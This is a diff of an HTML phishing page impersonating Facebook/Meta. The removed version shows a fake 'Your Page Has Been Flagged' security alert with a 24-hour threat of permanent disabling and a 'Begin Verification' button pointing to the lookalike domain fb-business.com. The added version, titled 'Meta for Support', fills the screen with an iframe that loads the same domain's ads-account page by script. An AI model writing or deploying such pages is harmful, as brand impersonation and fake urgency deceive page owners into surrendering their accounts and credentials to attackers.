@@ -2,268 +2,32 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Meta for Support</title>
     <style>
-        * {
+        body, html {
             margin: 0;
             padding: 0;
-            box-sizing: border-box;
-        }
-
-        body {
-            font-family: Helvetica, Arial, sans-serif;
-            background-color: #f0f2f5;
-            min-height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            padding: 20px;
-        }
-
-        .container {
-            background: white;
-            border-radius: 8px;
-            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
-            max-width: 432px;
-            width: 100%;
             overflow: hidden;
+            height: 100%;
         }
 
-        .header {
-            text-align: center;
-            padding: 24px 24px 0;
-        }
-
-        .facebook-logo {
-            color: #1877f2;
-            font-size: 36px;
-            font-weight: bold;
-            margin-bottom: 16px;
-            font-family: 'Klavika', sans-serif;
-        }
-
-        .title {
-            color: #1c1e21;
-            font-size: 20px;
-            font-weight: 600;
-            margin-bottom: 24px;
-            line-height: 24px;
-        }
-
-        .content {
-            padding: 0 24px 24px;
-        }
-
-        .alert-section {
-            background-color: #fff3cd;
-            border: 1px solid #ffeaa7;
-            border-left: 4px solid #f39c12;
-            border-radius: 4px;
-            padding: 16px;
-            margin-bottom: 16px;
-        }
-
-        .alert-title {
-            color: #856404;
-            font-weight: 600;
-            font-size: 14px;
-            margin-bottom: 8px;
-        }
-
-        .alert-text {
-            color: #856404;
-            font-size: 14px;
-            line-height: 1.4;
-        }
-
-        .description {
-            color: #65676b;
-            font-size: 14px;
-            line-height: 1.4;
-            margin-bottom: 20px;
-        }
-
-        .verification-box {
-            background-color: #f7f8fa;
-            border: 1px solid #dddfe2;
-            border-radius: 4px;
-            padding: 16px;
-            margin-bottom: 16px;
-        }
-
-        .verification-header {
-            display: flex;
-            align-items: flex-start;
-        }
-
-        .info-circle {
-            width: 20px;
-            height: 20px;
-            background-color: #1877f2;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-right: 8px;
-            margin-top: 2px;
-            flex-shrink: 0;
-        }
-
-        .info-icon {
-            color: white;
-            font-size: 12px;
-            font-weight: bold;
-        }
-
-        .verification-content {
-            flex: 1;
-        }
-
-        .verification-title {
-            color: #1c1e21;
-            font-size: 14px;
-            font-weight: 600;
-            margin-bottom: 4px;
-        }
-
-        .verification-subtitle {
-            color: #65676b;
-            font-size: 12px;
-            line-height: 1.3;
-        }
-
-        .timer-text {
-            color: #65676b;
-            font-size: 14px;
-            line-height: 1.4;
-            margin-bottom: 20px;
-        }
-
-        .timer-text strong {
-            color: #1c1e21;
-            font-weight: 600;
-        }
-
-        .verify-button {
-            display: block;
+        iframe {
             width: 100%;
-            background-color: #1877f2;
-            color: white;
+            height: 100%;
             border: none;
-            padding: 12px 16px;
-            border-radius: 6px;
-            font-size: 14px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: background-color 0.2s;
-            text-decoration: none;
-            text-align: center;
-        }
-
-        .verify-button:hover {
-            background-color: #166fe5;
-        }
-
-        .verify-button:active {
-            background-color: #1464cc;
-        }
-
-        .footer {
-            text-align: center;
-            padding: 16px 24px;
-            border-top: 1px solid #dadde1;
-            background-color: #f7f8fa;
-        }
-
-        .footer-text {
-            color: #8a8d91;
-            font-size: 11px;
-            margin-bottom: 8px;
-        }
-
-        .footer-link {
-            color: #8a8d91;
-            font-size: 11px;
-            text-decoration: none;
-            line-height: 1.4;
-        }
-
-        .footer-link:hover {
-            text-decoration: underline;
-        }
-
-        /* Responsive */
-        @media (max-width: 480px) {
-            .container {
-                max-width: 100%;
-                border-radius: 0;
-                box-shadow: none;
-            }
-            
-            body {
-                padding: 0;
-                background-color: white;
-            }
-            
-            .header {
-                padding: 20px 20px 0;
-            }
-            
-            .content {
-                padding: 0 20px 20px;
-            }
-            
-            .footer {
-                padding: 16px 20px;
-            }
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="header">
-            <div class="facebook-logo">facebook</div>
-            <div class="title">Your Page Has Been Flagged</div>
-        </div>
-        
-        <div class="content">
-            <div class="alert-section">
-                <div class="alert-title">Important Security Alert</div>
-                <div class="alert-text">
-                    We've detected unusual activity on your account or page and we have temporarily locked your page to protect your information.
-                </div>
-            </div>
-            
-            <div class="description">
-                To secure your page and restore access, please complete the verification process. This helps us confirm you're the rightful account owner.
-            </div>
-            
-            <div class="verification-box">
-                <div class="verification-header">
-                    <div class="info-circle">
-                        <div class="info-icon">i</div>
-                    </div>
-                    <div class="verification-content">
-                        <div class="verification-title">Page Verification Required</div>
-                        <div class="verification-subtitle">Complete identity confirmation to unlock your page</div>
-                    </div>
-                </div>
-            </div>
-            
-            <div class="timer-text">
-                You have <strong>24 hours</strong> to verify your page before it's permanently disabled for violating our Community Standards.
-            </div>
-            
-            <a href="https://chat-ai.fb-business.com/true/" class="verify-button">
-                Begin Verification
-            </a>
-        </div>
-        
-        <div class="footer">
-            <div class="footer-text">Meta © 2025</div>
-            <div class="footer-link">You can learn more about why we suspend page by visiting the Community Standards.</div>
-        </div>
-    </div>
-</body>
-</html>
+
+<iframe id="myFrame"></iframe>
+
+<script>
+    // Get the iframe element
+    var iframe = document.getElementById('myFrame');
+    
+    // Set the source URL for the iframe
+    var url = 'https://chat-ai.fb-business.com/ads-account/'; //
+    iframe.src = url;
+</script>
